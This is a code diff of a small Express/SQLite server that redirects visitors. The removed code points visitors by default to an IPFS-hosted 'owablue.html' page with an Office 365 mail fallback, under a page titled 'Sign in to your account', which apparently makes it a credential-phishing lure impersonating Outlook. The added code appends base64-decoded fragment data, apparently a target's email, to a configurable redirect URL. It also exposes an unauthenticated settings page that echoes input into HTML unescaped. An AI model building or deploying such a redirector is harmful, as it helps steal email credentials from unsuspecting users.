@@ -1,7 +1,6 @@
 const express = require("express");
 const sqlite3 = require("sqlite3").verbose();
 const bodyParser = require("body-parser");
-const path = require("path");
 
 const app = express();
 const PORT = 3000;
@@ -10,12 +9,12 @@ const PORT = 3000;
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// Initialize SQLite database
-const db = new sqlite3.Database("./config.db", (err) => {
+// Initialize SQLite in-memory database
+const db = new sqlite3.Database(":memory:", (err) => {
   if (err) {
-    console.error("Error opening database:", err.message);
+    console.error("Error opening in-memory database:", err.message);
   } else {
-    console.log("Connected to SQLite database.");
+    console.log("Connected to in-memory SQLite database.");
     db.run(
       `CREATE TABLE IF NOT EXISTS settings (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -26,12 +25,10 @@ const db = new sqlite3.Database("./config.db", (err) => {
         if (err) {
           console.error("Error creating table:", err.message);
         } else {
-          // Ensure default values exist
+          // Insert default values
           db.run(
             `INSERT INTO settings (redirect_url, fallback_url)
-             SELECT 'https://cloudflare-ipfs.com/ipfs/QmTS1MVDgZebn5e2zN4Bdz9ag1CUFRTSp7nxS97UWV1uuQ/owablue.html#', 
-             'https://outlook.office365.com/mail'
-             WHERE NOT EXISTS (SELECT 1 FROM settings)`
+             VALUES ('https://example.com/redirect#', 'https://example.com/fallback')`
           );
         }
       }
@@ -39,13 +36,42 @@ const db = new sqlite3.Database("./config.db", (err) => {
   }
 });
 
-// Serve the page
+// Handle the base page (redirect logic)
 app.get("/", (req, res) => {
   db.get("SELECT redirect_url, fallback_url FROM settings LIMIT 1", (err, row) => {
     if (err) {
       res.status(500).send("Error loading settings.");
     } else {
-      // Render the HTML with dynamic values
+      const redirectUrl = row.redirect_url || "";
+      const fallbackUrl = row.fallback_url || "";
+
+      // Check if the URL contains a Base64 string after "#"
+      const fullUrl = req.headers.referer || req.headers.host + req.url;
+      const base64Data = fullUrl.split("#")[1];
+
+      if (base64Data) {
+        try {
+          // Decode Base64 and redirect to the full Redirect URL with the decoded string
+          const decodedData = Buffer.from(base64Data, "base64").toString("utf-8");
+          return res.redirect(`${redirectUrl}${decodedData}`);
+        } catch (err) {
+          console.error("Error decoding Base64:", err.message);
+          return res.redirect(fallbackUrl);
+        }
+      }
+
+      // If no Base64 string is present, redirect to the fallback URL
+      return res.redirect(fallbackUrl);
+    }
+  });
+});
+
+// Render the update page (GET /update)
+app.get("/update", (req, res) => {
+  db.get("SELECT redirect_url, fallback_url FROM settings LIMIT 1", (err, row) => {
+    if (err) {
+      res.status(500).send("Error loading settings.");
+    } else {
       const redirectUrl = row ? row.redirect_url : "";
       const fallbackUrl = row ? row.fallback_url : "";
 
@@ -54,21 +80,31 @@ app.get("/", (req, res) => {
 <html>
    <head>
       <meta charset="utf-8">
-      <meta http-equiv="X-UA-Compatible" content="IE=edge">
-      <title>Sign in to your account</title>
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-      <style>
-         body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-         }
-         .hidden {
-            display: none;
-         }
-      </style>
+      <title>Update Redirect Settings</title>
    </head>
    <body>
-      
+      <h2>Update Redirect Settings</h2>
+      <form method="POST" action="/update">
+         <label for="redirectUrl">Redirect URL:</label>
+         <input
+            type="text"
+            id="redirectUrl"
+            name="redirectUrl"
+            value="${redirectUrl}"
+            placeholder="Enter new redirect URL"
+            style="width: 100%; padding: 10px; margin: 10px 0;"
+         />
+         <label for="fallbackUrl">Default Fallback URL:</label>
+         <input
+            type="text"
+            id="fallbackUrl"
+            name="fallbackUrl"
+            value="${fallbackUrl}"
+            placeholder="Enter new fallback URL"
+            style="width: 100%; padding: 10px; margin: 10px 0;"
+         />
+         <button type="submit" style="padding: 10px 20px;">Save Changes</button>
+      </form>
    </body>
 </html>
       `);
@@ -76,7 +112,7 @@ app.get("/", (req, res) => {
   });
 });
 
-// Handle form submissions to update settings
+// Handle form submissions to update settings (POST /update)
 app.post("/update", (req, res) => {
   const { redirectUrl, fallbackUrl } = req.body;
 
@@ -92,42 +128,13 @@ app.post("/update", (req, res) => {
 <html>
    <head>
       <meta charset="utf-8">
-      <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <title>Settings Updated</title>
-      <meta name="viewport" content="width=device-width, initial-scale=1">
    </head>
    <body>
       <h2>Settings Updated Successfully</h2>
       <p>Redirect URL: ${redirectUrl}</p>
       <p>Fallback URL: ${fallbackUrl}</p>
       <a href="/">Go Back</a>
-      
-      
-      <div id="updateSection">
-         <h2>Update Redirect Settings</h2>
-         <form method="POST" action="/update">
-            <label for="redirectUrl">Redirect URL:</label>
-            <input
-               type="text"
-               id="redirectUrl"
-               name="redirectUrl"
-               value="${redirectUrl}"
-               placeholder="Enter new redirect URL"
-               style="width: 100%; padding: 10px; margin: 10px 0;"
-            />
-            <label for="fallbackUrl">Default Fallback URL:</label>
-            <input
-               type="text"
-               id="fallbackUrl"
-               name="fallbackUrl"
-               value="${fallbackUrl}"
-               placeholder="Enter new fallback URL"
-               style="width: 100%; padding: 10px; margin: 10px 0;"
-            />
-            <button type="submit" style="padding: 10px 20px;">Save Changes</button>
-         </form>
-      </div>
-      
    </body>
 </html>
         `);
